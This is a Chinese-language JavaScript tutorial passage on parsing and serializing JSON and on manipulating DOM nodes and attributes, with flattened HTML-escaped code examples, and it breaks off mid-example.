解析和序列化JS中的JSON解析JSON数据的目的是为了将数据渲染到前端（浏览器）。 渲染实例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;body&gt; &lt;!-- 渲染数据到前端 --&gt; &lt;ul class=&quot;stu-list&quot;&gt;&lt;/ul&gt;&lt;/body&gt;&lt;script&gt; let info = [ &#123; sno: &quot;00137&quot;, sname: &quot;张三&quot;, age: 18, tel: 13597304384, score: [78,90,93] &#125;, &#123; sno: &quot;00138&quot;, sname: &quot;李四&quot;, age: 18, tel: 13597304333, score: [72,93,63] &#125;, &#123; sno: &quot;00139&quot;, sname: &quot;王五&quot;, age: 19, tel: 13697304333, score: [62,90,93] &#125;, &#123; sno: &quot;00140&quot;, sname: &quot;小绘&quot;, age: 17, tel: 13697350323, score: [92,98,99] &#125; ]; var txt = &#x27;&#x27;; for(var i in info)&#123; console.log(info[i]); txt +=&#x27;&lt;li&gt;&#x27;+&#x27;姓名：&#x27;+info[i].sname+&#x27;&lt;br/&gt;&#x27;+&#x27;电话：&#x27;+info[i].tel+&#x27;&lt;/li&gt;&#x27; &#125; console.log(txt); // 动态渲染数据 document.getElementsByClassName(&#x27;stu-list&#x27;)[0].innerHTML = txt;&lt;/script&gt; JS中，如果是JSON格式的字符串，不需要解析，可以直接访问。 123456789101112131415161718192021222324252627&lt;script&gt; let info = [ &#123; sno: &quot;00137&quot;, sname: &quot;张三&quot;, age: 18, tel: 13597304384, score: [78,90,93] &#125;, &#123; sno: &quot;00138&quot;, sname: &quot;李四&quot;, age: 18, tel: 13597304333, score: [72,93,63] &#125;, &#123; sno: &quot;00139&quot;, sname: &quot;王五&quot;, age: 19, tel: 13697304333, score: [62,90,93] &#125; ]; // 解析JSON（直接访问JSON存储的变量即可） console.log(info);&lt;/script&gt; 如果是载入的JSON文件，我们需要对其进行使用，那么就必须对JSON字符串解析成原生的JavaScript值。当然，如果是原生的JavaScript对象或数组，也可以转换成JSON字符串。 对于讲JSON字符串解析为JavaScript原生值，早期采用的是eval()函数。但这种方法既不安全，可能会执行一些恶意代码。 1234var box = &#x27;[&#123;&quot;name&quot;: &quot;a&quot;,&quot;age&quot;: 1&#125;,&#123;&quot;name&quot;: &quot;b&quot;,&quot;age&quot;: 2&#125;]&#x27;; alert(box); // JSON字符串var json = eval(box); // 使用eval()函数解析alert(json); ECMAScript5对解析JSON的行为进行规范，定义了全局对象JSON。支持这个对象的浏览器有IE8+、 Firefox3.5+、Safari4+、Chrome和Opera10.5+。不支持的浏览器也可以通过一个开源库json.js来模拟执行。 JSON对象提供了两个方法，一个是将原生JavaScript值转换为JSON字符串：stringify()；另一个是将JSON字符串转 换为JavaScript原生值：parse()。 1234567891011121314151617181920212223242526272829303132&lt;script&gt; let info = &#x27;[\\ &#123;\\ &quot;sno&quot;: &quot;00137&quot;,\\ &quot;sname&quot;: &quot;张三&quot;,\\ &quot;age&quot;: 18,\\ &quot;tel&quot;: 13597304384,\\ &quot;score&quot;: [78,90,93]\\ &#125;,\\ &#123;\\ &quot;sno&quot;: &quot;00138&quot;,\\ &quot;sname&quot;: &quot;李四&quot;,\\ &quot;age&quot;: 18,\\ &quot;tel&quot;: 13597304333,\\ &quot;score&quot;: [72,93,63]\\ &#125;,\\ &#123;\\ &quot;sno&quot;: &quot;00139&quot;,\\ &quot;sname&quot;: &quot;王五&quot;,\\ &quot;age&quot;: 19,\\ &quot;tel&quot;: 13697304333,\\ &quot;score&quot;: [62,90,93]\\ &#125;\\ ]&#x27;; //记得使用续航符连接数据成为字符串 console.log(info); // 如果返回具有JSON格式的字符串，需要将它解析为JavaScript识别的JSON格式，用JSON.parse()方法实现。 //JSON格式的字符串规范：其中的键必须用双引号引起来，值如果是字符型数据，也必须用双引号引起来， console.log(JSON.parse(info));//将JSON格式字符串转换为JSON info = JSON.parse(info); console.log(JSON.stringify(info));//将JSON转换为JSON格式字符串。&lt;/script&gt; 在序列化JSON的过程中，stringify()方法还提供了第二个参数。第一个参数可以是一个数组（数组包含需要选中的值），也可以是一个函数，用于过滤结果。第二个参数则表示是否在JSON字符串中保留缩进。 12345678910111213141516171819202122var box = [&#123;name: &#x27;a&#x27;, age: 1, height: 177&#125;,&#123;name: &#x27;b&#x27;, age: 2, height: 188&#125;]; var json = JSON.stringify(box, [&#x27;name&#x27;, &#x27;age&#x27;], 4); //[ &#123; &quot;name&quot;: &quot;a&quot;, &quot;age&quot;: 1 &#125;, &#123; &quot;name&quot;: &quot;b&quot;, &quot;age&quot;: 2 &#125;]var json = JSON.stringify(box, [&#x27;name&#x27;, &#x27;age&#x27;], 4); //[ &#123; &quot;name&quot;: &quot;a&quot; &#125;, &#123; &quot;name&quot;: &quot;b&quot; &#125;]alert(json); PS：如果不需要保留缩进，则不填即可；如果不需要过滤结果，但又要保留缩进，则讲过滤结果的参数设置为 null。如果采用函数，可以进行复杂的过滤。 123456789101112var box = [&#123;name: &#x27;a&#x27;, age: 1, height: 177&#125;,&#123;name: &#x27;b&#x27;, age: 2, height: 188&#125;]; var json = JSON.stringify(box, function(key, value) &#123; switch (key) &#123;case &#x27;name&#x27;:return &#x27;Mr．&#x27; + value;case &#x27;age&#x27;:return value + &#x27;岁&#x27;;default:return value; &#125; &#125;, 4); alert(json); PS：保留缩进除了是普通的数字，也可以是字符。 还有一种方法可以自定义过滤一些数据，使用toJSON()方法，可以将某一组对象里指定返回某个值。 1234567var box = [&#123;name: &#x27;a&#x27;, age: 1, height: 177, toJSON: function() &#123; return this.name; &#125;&#125;,&#123;name: &#x27;b&#x27;,age: 2, height: 188, toJSON: function() &#123; return this.name; &#125;&#125;]; var json = JSON.stringify(box); alert(json); PS：由此可见序列化也有执行顺序，首先先执行toJSON()方法；如果应用了第二个过滤参数，则执行这个方法；然后执行序列化过程，比如将键值对组成合法的JSON字符串，比如加上双引号。如果提供了缩进，再执行缩进操作。 解析JSON字符串方法parse()也可以接受第二个参数，这样可以在还原出JavaScript值的时候替换成自己想要的值。 123456789var box = &#x27;[&#123;&quot;name&quot;: &quot;a&quot;,&quot;age&quot;: 1&#125;,&#123;&quot;name&quot;: &quot;b&quot;,&quot;age&quot;: 2&#125;]&#x27;; var json = JSON.parse(box, function(key, value) &#123; if (key == &#x27;name&#x27;) &#123;return &#x27;Mr．&#x27; + value; &#125; else &#123;return value; &#125; &#125;); alert(json[0].name); 转格式后的数据渲染 12345678910111213141516171819202122232425262728293031323334353637&lt;body&gt; &lt;!-- 渲染数据到前端 --&gt; &lt;ul class=&quot;stu-list&quot;&gt;&lt;/ul&gt;&lt;/body&gt;&lt;script&gt; let info = &#x27;[\\ &#123;\\ &quot;sno&quot;: &quot;00137&quot;,\\ &quot;sname&quot;: &quot;张三&quot;,\\ &quot;age&quot;: 18,\\ &quot;tel&quot;: 13597304384,\\ &quot;score&quot;: [78,90,93]\\ &#125;,\\ &#123;\\ &quot;sno&quot;: &quot;00138&quot;,\\ &quot;sname&quot;: &quot;李四&quot;,\\ &quot;age&quot;: 18,\\ &quot;tel&quot;: 13597304333,\\ &quot;score&quot;: [72,93,63]\\ &#125;,\\ &#123;\\ &quot;sno&quot;: &quot;00139&quot;,\\ &quot;sname&quot;: &quot;王五&quot;,\\ &quot;age&quot;: 19,\\ &quot;tel&quot;: 13697304333,\\ &quot;score&quot;: [62,90,93]\\ &#125;\\ ]&#x27;; var txt = &#x27;&#x27;; for(var i in JSON.parse(info))&#123; console.log( JSON.parse(info)); txt +=&#x27;&lt;li&gt;&#x27;+&#x27;姓名：&#x27;+ JSON.parse(info)[i].sname+&#x27;&lt;br/&gt;&#x27;+&#x27;电话：&#x27;+ JSON.parse(info)[i].tel+&#x27;&lt;/li&gt;&#x27; &#125; console.log(txt); // 动态渲染数据 document.getElementsByClassName(&#x27;stu-list&#x27;)[0].innerHTML = txt;&lt;/script&gt; 解析JSON文件JSON文件必须用Ajax(异步JavaScript和XML ，一种创建交互式网页应用的技术)技术去获取数据。 Ajax请求操作详细步骤（了解）： 12345678910111213141516171819202122&lt;body&gt; &lt;ul class=&quot;stu-list&quot;&gt;&lt;/ul&gt;&lt;/body&gt;&lt;script&gt; //第一步：创建请求对象 var xhr = new XMLHttpRequest(); //第二步：建立请求连接 xhr.open(&#x27;get&#x27;,&#x27;./students.json&#x27;,true); //get表示请求方式，url为请求路径，true表示异步操作（发送请求的同时可以进行其他操作） //第四步：前端对请求结果进行处理。 xhr.onreadystatechange = function() &#123; // JS中事件全部要加on if(xhr.readyState == 4&amp;&amp; xhr.status == 200)&#123;//4为发送请求成功，200为请求成功，如果两个都成功 // console.log(JSON.parse(xhr.responseText));//responseText：获取请求结果 var data = JSON.parse(xhr.responseText),txt = &#x27;&#x27;; for(var i in data)&#123; txt += &#x27;&lt;li&gt;&#x27; + data[i].sname + &#x27;&lt;/li&gt;&#x27;; console.log(txt); &#125; document.getElementsByClassName(&#x27;stu-list&#x27;)[0].innerHTML = txt; &#125; &#125;; xhr.send();//第三步：向后台发送请求&lt;/script&gt; 注意：如果发送Ajax请求，必须以http(服务器端)的方式启动文件，不能在本地直接打开 17.2 DOM介绍17.2.1 DOM介绍HTML DOM 是W3C标准（是HTML文档对象模型的英文缩写，Document Object Modefor HTML）。HTML DOM定义了用于HTML和XML的一系列标准的对象，以及访问和处理 HTML文档的标准方法。 通过DOM，可以访问所有的HTML元素，连同它们所包含的文本和属性。可以对其中的内容进行修改和删除，同时也可以创建新的元素。HTML DOM 独立于平台和编程语言。它可被任何编程语言诸如Java、JavaScript 和VBScript 使用。 17.2.2 DOM树HTML DOM 定义了访问和操作HTML文档的标准方法。DOM 将 HTML和 XML文档表达为树结构。如图： 17.2.3 DOM节点DOM是文档对象化模型（Document Object Model）的简称。使用过DHTML对象模型的开发者一定能非常熟练地操作HTML页面上的每个标记内容，但如果借助DOM技术， 我们就可以通过更加直接而且简易的方式达到同样的目的。 DOM技术被Internet Explorer5.0及以上版本的浏览器所支持，它采取一种非常直观且一致的方式将HTML文档进行模型化处理，并借此提供访问、导航和操作页面的简易编程接口。通过DOM技术，我们不仅能够访问和更新页面的内容及结构，而且还能操纵文档的风格样式。DOM由W3C 组织所倡导，这样，大多数浏览器都将最终支持这项技术。 DOM－Document Object Mode,它是W3C国际组织的一套Web标准，它定义了访问HTML文档对象的一套属性、方法和事件 。 17.2.3.1 节点层次父子节点，同胞节点 节点树中的节点彼此拥有层级关系。父（parent）、子（child）和同胞（sibling）等术语用于描述这些关 系。父节点拥有子节点。同级的子节点被称为同胞（兄弟或姐妹）。 在节点树中，顶端节点被称为根（root） 每个节点都有父节点、除了根（它没有父节点） 一个节点可拥有任意数量的子节点 同胞是拥有相同父节点的节点 17.2.3.2 节点分类常见的节点类型有： 元素节点：标签 属性节点：标签的属性 文本节点 ：标签中的换行符 文档节点：document 这些节点他们都有自己的特点，每个节点的名称，节点的属性，节点对应的值都不相同。在我们平时的工作中，我们可以通过节点的值或名称来判断是什么节点。 17.2.3.3 节点的名称nodeName 是只读的也就是不能被重新赋值修改。 节点类型 nodeName 元素节点 标签名相同 属性节点 属性名相同 文本节点 #text 文档节点 #document 注意：nodeName 始终包含 HTM元素的大写字母标签名。 12345678910111213141516171819202122&lt;body&gt; &lt;div class=&quot;wrapper&quot;&gt; &lt;div class=&quot;box&quot;&gt; &lt;div id=&quot;content&quot; title=&quot;测试&quot;&gt; 测试内容&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt;/*获取节点名称*///标签节点 console.log(document.getElementById(&#x27;content&#x27;).nodeName); //输出DIV//属性节点 console.log(document.getElementById(&#x27;content&#x27;).getAttributeNode(&#x27;title&#x27;).nodeName); // 输出titletitle = &quot;测试&quot;//文本节点console.log(document.getElementById(&#x27;content&#x27;).childNodes[0].nodeName); // 输出#test//文档节点console.log(document.nodeName); // 输出#documentconsole.log(document); //访问整个文档&lt;/script&gt; 17.2.3.4 节点的值nodeValue 属性规定节点的值。 节点类型 nodeValue 元素节点 是undefined或null 文本节点 文本本身 属性节点 属性值 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;DOM属性&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;wrapper&quot;&gt; &lt;div class=&quot;box&quot;&gt; &lt;div id=&quot;content&quot; title=&quot;测试&quot;&gt; 测试内容&lt;/div&gt; &lt;p style=&quot;color:aqua;background-color: #8080ff;font-size: 30px;&quot;&gt;天天睡懒觉y( •̀ ω •́ )y&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; /*获取节点值*/ //元素节点 console.log(document.getElementById(&#x27;content&#x27;).nodeValue); //输出 null //文本节点 console.log(document.getElementById(&#x27;content&#x27;).childNodes[0].nodeValue); //输出 测试内容 //属性节点 console.log(document.getElementById(&#x27;content&#x27;).getAttributeNode(&#x27;title&#x27;).nodeValue); //输出 测试 //文档节点 console.log(document.getElementsByTagName(&#x27;p&#x27;)[0].getAttributeNode(&#x27;style&#x27;).nodeValue); //输出 color:aqua;background-color: #8080ff;font-size: 30px;&lt;/script&gt;&lt;/html&gt; 17.2.3.5 节点的类型nodeType 属性返回节点的类型。nodeType 是只读的，同样是不可以被修改，只可以访问。 元素类型 nodeType 元素 1 属性 2 文本 3 注释 8 文档 9 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;DOM属性&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;wrapper&quot;&gt; &lt;div class=&quot;box&quot;&gt; &lt;div id=&quot;content&quot; title=&quot;测试&quot;&gt; 测试内容&lt;/div&gt; &lt;p style=&quot;color:aqua;background-color: #8080ff;font-size: 30px;&quot;&gt;天天睡懒觉y( •̀ ω •́ )y&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; /*获取节点类型*/ //元素1 console.log(document.getElementById(&#x27;content&#x27;).nodeType); //属性2 console.log(document.getElementsByTagName(&#x27;p&#x27;)[0].getAttributeNode(&#x27;style&#x27;).nodeType); //文本3 console.log(document.getElementsByTagName(&#x27;p&#x27;)[0].childNodes[0].nodeType); //注释8 console.log(); //文档9 console.log(document.nodeType);&lt;/script&gt;&lt;/html&gt; 17.3 节点操作17.3.1 获取节点我们获取节点的方法有很多，最基础常用的有： 通过使用 getElementById() 方法 通过使用 getElementsByTagName() 方法 通过使用 getElementsByClassName() 方法 注意： 我们获取节点最重要的返回的是一个节点还是一个节点数组。这个问题一定要搞清楚，不然会影响我们 的思考。这也是初学者常犯的错误。 通过ID获取节点 【返回具体某个节点】 getElementById 通过标签名获取节点 【返回节点数组，即使只有一个】getElementsByTagName 通过标签的name值获取节点 【返回节点数组】 getElementsByName 通过class值来获取节点 【返回节点数组】 getElementsByClassName 根据选择器返回找到结果集中的第一个 querySelect(“选择器”) 根据选择器返回找到的结果集，是个节点数组 querySelectAll(“选择器”) 注意： 我们的getElementsByClassName、querySelector这两个方法在Internet Explorer 5,6,7,8 中无效。 我们使用这些方法可以是某个具体的节点，如果是某个具体的节点那就是从这个节点往下寻找，如果不确定是从 哪往下找，我们一般使用根节点，文档节点调用方法。 我们使用这些方法可以是某个具体的节点，如果是某个具体的节点那就是从这个节点往下寻找，如果不确定是 从哪往下找，我们一般使用根节点，文档节点调用方法。 12// 找到文档节点，然后在内部寻找id值为bb的节点document.getElementById(&quot;bb&quot;); 当然我们还可以使用节点关系来寻找到某些的节点 1234// 通过id值aa获取到节点赋给变量aavar aa = document.getElementById(&quot;aa&quot;); // 获取aa的父节点console.log(aa.parentNode) 注意空白文本节点 1234567891011121314151617&lt;body&gt; &lt;div&gt; &lt;button&gt;你好&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt; // 因为ByTagName的方法获取到的是节点数组，我们如果页面里只有一个div，这个时候就是这个节点数组的第一个元素 var div = document.getElementsByTagName(&quot;div&quot;)[0]; console.log(div.childNodes) //NodeList(3) /* 0: text 1: button 2: text */ console.log(div.children) //HTMLCollection(1)&lt;/script&gt; 大家会发现输出的是一个数组，数组的个数为3个，为什么是三个？明明只有一个button节点，其实错了。还包含了两个空白的文本节点。但是下面那个却只输出了一个节点。为什么呢？ childNodes返回的是节点的子节点集合，包括元素节点、文本节点还有属性节点。【小坑：在火狐浏览器里，childNodes相当于children,只获取元素节点】 children返回的只是节点的元素节点集合，所以返回的只有button元素。 17.3.2 创建和插入节点如果想往DOM 添加新元素，我们必须首先创建该元素（元素节点），然后向一个已存在的元素追加该元素。 17.3.2.1 创建节点语法： 1234//创建一个元素节点document.createElement(&quot;标签名&quot;);//创建一个文本节点document.createTextNode(&quot;文本内容&quot;); 注意：如果我们使用for循环不断的创建，然后直接放入到页面里这是极高的损耗浏览器性能的，所以我们创 建代码片段（为避免频繁刷新DOM，可以先创造代码片段，完成所有节点操作之后统一添加到DOM中） 创建实例： 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .wrapper &#123; color: cyan; font: 18px 宋体bold; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;script&gt; //创建元素节点 var el = document.createElement(&#x27;p&#x27;); console.log(el); //创建文本节点 var txt = document.createTextNode(&#x27;这个节点是动态创建的！&#x27;); console.log(txt); //创建属性节点 var attr = document.createAttribute(&#x27;class&#x27;); //添加属性名 attr.value = &#x27;wrapper&#x27;;//为属性设置值 console.log(attr); //整合/关联以上三个节点 el.appendChild(txt); //为元素节点添加text文本节点 console.log(el); el.setAttributeNode(attr); //为元素节点添加属性 document.body.appendChild(el);&lt;/script&gt;&lt;/html&gt; 简介创建方法： 12345//效果与上面相同var el = document.createElement(&#x27;p&#x27;); //创建一个元素节点el.createAttribute(&#x27;class&#x27;,&#x27;wrapper box&#x27;); //为元素节点添加属性和属性值el.innerHTML = &#x27;这是一种简介创建方式！&#x27;;//为元素节点设置问本内容document.body.appendChild(el); //将创建的节点添加到文档中 批量创建还可以封装函数实现 17.3.2.2 插入节点插入节点有两种办法，第一种思路是插入到某个节点的内部的尾部我们称为appendChild，这个时候我们只需 要知道是哪个父节点需要放子节点就可以了；第二种思路是插入到某个节点的的内部的某个节点的前面，这个时候我 们就需要知道父节点是什么，同时我们还需要知道子节点是哪个，才好放在谁前面。 １.插入内部的尾部1父节点.appendChild(创建的节点) ２.插入内部的某个前面1父节点.insertBefore(创建的节点,已知的子节点) 上面这个代码比较有意思，我们实现了将新创建的节点放到需要放的节点里面的第一个的位置。 实例： 12345678910111213141516171819202122232425&lt;body&gt; &lt;ul class=&quot;list&quot;&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;script&gt; //插入到最后 var li = document.createElement(&#x27;li&#x27;); var txt = document.createTextNode(&#x27;插入节点章节&#x27;); li.appendChild(txt); var list = document.getElementsByClassName(&#x27;list&#x27;)[0]; list.appendChild(li); // 插入到指定元素前面 // 或var oLi = document.getElementsByTagName(&#x27;li&#x27;)[2]; let ul = document.getElementsByClassName(&#x27;list&#x27;)[0]; console.log(ul); let oLi = ul.getElementsByTagName(&#x27;li&#x27;)[2]; ul.insertBefore(li,oLi); //注意：会有覆盖效果&lt;/script&gt; 17.3.3 替换节点替换节点是我们将某个子节点替换成我们自己想要的节点。 1父节点.replaceChild(新节点，老节点) 实例： 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;replaceChild&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt; &lt;strong&gt;Strong&lt;/strong&gt;&lt;/body&gt;&lt;script&gt; //需求：替换掉Strong标签改为p标签 // 创建节点 let newP = document.createElement(&#x27;p&#x27;); newP.setAttribute(&#x27;style&#x27;,&#x27;color:#8080ff;border:1px solid #ff00ff;&#x27;); newP.setAttribute(&#x27;title&#x27;,&#x27;节点修改&#x27;); console.log(newP); newP.innerHTML = &#x27;这是一个替换标签的测试&#x27;; //替换节点 var body = document.body; // 对节点的获取，最好缓存到内存变量中。 var strong = document.getElementsByTagName(&#x27;strong&#x27;)[0];//找到老节点 body.replaceChild(newP,strong); //父节点.replaceChild(新节点，老节点)&lt;/script&gt;&lt;/html&gt; 17.3.4 克隆节点克隆节点就是将我们需要的节点复制一份，我们的克隆节点有深度克隆和浅克隆。 深度克隆： 包含子节点一起克隆。 浅克隆： 只会将找到的这个节点克隆，子节点不会克隆 123需要被复制的节点. cloneNode(true/false); true: 复制当前节点以及所有子节点 false: 仅复制当前节点 实例： 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;clone节点&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box&quot;&gt; &lt;strong&gt;strong&lt;/strong&gt; &lt;span&gt;&lt;/span&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; var box = document.getElementsByClassName(&#x27;box&#x27;)[0]; //深度克隆 var deepClone_test = box.cloneNode(true); document.body.appendChild(deepClone_test); // 浅度克隆 shallowClone_test = box.cloneNode(false); document.body.appendChild(shallowClone_test);&lt;/script&gt;&lt;/html&gt; 17.3.5 删除节点方法一删除当前节点及其子节点。 1节点.remove(); 方法二删除节点就是从我们的页面中删除这个节点。我们需要去找到需要删除的节点的父节点，然后在去使用 removeChild方法删除对应的节点。 12删除节点就是从我们的页面中删除这个节点。我们需要去找到需要删除的节点的父节点，然后在去使用removeChild方法删除对应的节点。 实例： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;删除节点&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;box&quot;&gt; &lt;strong&gt;strong&lt;/strong&gt; &lt;span&gt;&lt;/span&gt; &lt;/div&gt; &lt;ul&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;script&gt; var box = document.getElementsByClassName(&#x27;box&#x27;)[0]; //删除当前节点及其子节点 // box.remove(); //通过父节点删除 var span = box.getElementsByTagName(&#x27;span&#x27;)[0]; box.removeChild(span); //需求：删除ul中的所有li标签 var ul = document.getElementsByTagName(&#x27;ul&#x27;)[0]; var lis = ul.getElementsByTagName(&#x27;li&#x27;); console.log(lis.length); for(var i=0;i&lt;lis.length;i++)&#123; ul.removeChild(lis[i]); --i;//因为remove是从前往后删除，删除后，第二个元素会到第一个元素的位置去，但是i已经增大了 //其实用while更好一点 &#125;&lt;/script&gt;&lt;/html&gt; 注意：调用删除方法的节点必须是要被删除节点的父节点。 17.4 节点属性操作我们每个节点都是有很多属性的，有一些属性是某些节点所特有的，有些时所有节点都有的属性。如 id,class,title等等。还有一些我们称之为自定义属性是以data-开头的属性。 1&lt;div id=&quot;box&quot; data-str=&quot;前端开发&quot;&gt;教育&lt;/div&gt; 这个data-str就是我们的自定义属性，注意我们的自定义属性必须要以data-开头！ 17.4.1 获取属性 由于我们的节点也是对象，所以我们的节点的属性我们可以通过前面我们对象的访问属性的方法用点去访问,同时我们DOM节点对象还单独提供了getAttribute()方法获取属性。 12节点.属性名 // 用点号获取 【方法一】节点.getAttribute(&quot;属性名&quot;) // 用getAttribute获取 【方法二】 区别： 方法一只能获取已经包含的属性，不能获取自定义属性 方法二是所有的属性都可以获取，包括用户自定义属性 12345678&lt;body&gt; &lt;div id=&quot;box&quot; data-str=&quot;前端开发&quot;&gt;教育&lt;/div&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt; var box = document.getElementById(&quot;box&quot;); console.log(box.id); // 输出 &quot;box&quot; console.log(box.getAttribute(&quot;data-str&quot;)); // 输出 &quot;前端开发&quot;&lt;/script&gt; 17.4.2 设置属性设置属性的方法很简单，也有两种方法和上面基本对应。 12节点.属性名 = 属性值; //【方法一】,不能设置用户自定义属性节点.setAttribute(&quot;属性名&quot;,属性值); //【方法二】 123456789&lt;body&gt; &lt;img src=&quot;&quot;/&gt; &lt;/body&gt; &lt;script type=&quot;text/javascript&quot;&gt; var img = document.getElementsByTagName(&quot;img&quot;)[0]; img.src = &quot;img/aaa.png&quot;; // 设置图片路径 img.setAttribute(&quot;alt&quot;,&quot;很帅！&quot;) img.setAttribute(&quot;data-aaa&quot;,&quot;我很好&quot;) &lt;/script&gt; 17.4.3 删除属性删除属性有两种方法，第一种是将这个属性名对应的属性值置位空；第二种是将节点上对应的这个属性给删除 了。 第一种方法并不是真正的删除。 12节点.属性名 = &quot;&quot;; //不能删除用户自定义属性节点.removeAttribute(&quot;属性名&quot;); // 将节点上这个属性删除 12345678&lt;body&gt; &lt;img src=&quot;img/aaa.png&quot;/ alt=&quot;很帅&quot; data-aaa=&quot;我很好&quot;&gt; &lt;/body&gt; &lt;script type=&quot;text/javascript&quot;&gt; var img = document.getElementsByTagName(&quot;img&quot;)[0]; img.src = &quot;&quot;; // 设置图片路径 img.removeAttribute(&quot;data-aaa&quot;); &lt;/script&gt; 17.4.4 实例切换图片：轮播图原理 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;button id=&quot;btn&quot;&gt;切换图片&lt;/button&gt; &lt;img src=&quot;../imgs/insert1.png&quot; alt=&quot;蝴蝶&quot; style=&quot;width:200px;display: block;&quot; data-src=&quot;../imgs/payment.jpg&quot;&gt; &lt;img alt=&quot;蝴蝶&quot; style=&quot;width:200px;display: block;&quot;&gt;&lt;/body&gt;&lt;script&gt; //获取图片属性 //方法一：不能获取用户自定义属性 console.log(document.getElementsByTagName(&#x27;img&#x27;)[0]); console.log(document.getElementsByTagName(&#x27;img&#x27;)[0].alt); console.log(document.getElementsByTagName(&#x27;img&#x27;)[0].src); //方法二：可以获取用户自定义属性 console.log(document.getElementsByTagName(&#x27;img&#x27;)[0].getAttribute(&#x27;src&#x27;)); console.log(document.getElementsByTagName(&#x27;img&#x27;)[0].getAttribute(&#x27;alt&#x27;)); console.log(document.getElementsByTagName(&#x27;img&#x27;)[0].getAttribute(&#x27;data-src&#x27;)); //设置属性 var img = document.getElementsByTagName(&#x27;img&#x27;); img[1].src = &quot;../imgs/test.png&quot;; document.getElementById(&#x27;btn&#x27;).onclick = function() &#123; //鼠标点击后调用函数。 var url = img[0].getAttribute(&#x27;data-src&#x27;); img[0].setAttribute(&#x27;src&#x27;,url) ; &#125; //删除属性 img[1].src = &#x27;&#x27;; img[1].removeAttribute(&#x27;alt&#x27;);&lt;/script&gt;&lt;/html&gt; 17.5 节点文本操作17.5.1 获取文本获取节点文本主要通过访问节点的属性来获得，分别有以下三个属性：innerHTM、innerText、value。 1234节点.innerHTM //获取节点下的所有内容包含了标签，用于获取双标签文本内容，单标签是不行的。节点.innerText // 获取节点下的文本内容，会过滤掉标签节点.value // 获取input输入框等表单控件的内容节点.getAttribute(“value”) //value是表单输入框的属性，可以使用getAttribute获得value值 1234567891011121314151617181920212223242526272829303132333435&lt;body&gt; &lt;button id=&quot;btn&quot;&gt;切换图片&lt;span&gt;请点击&lt;/span&gt;&lt;/button&gt; &lt;img src=&quot;../imgs/insert1.png&quot; alt=&quot;蝴蝶&quot; style=&quot;width:200px;display: block;&quot; data-src=&quot;../imgs/payment.jpg&quot;&gt; &lt;img alt=&quot;蝴蝶&quot; 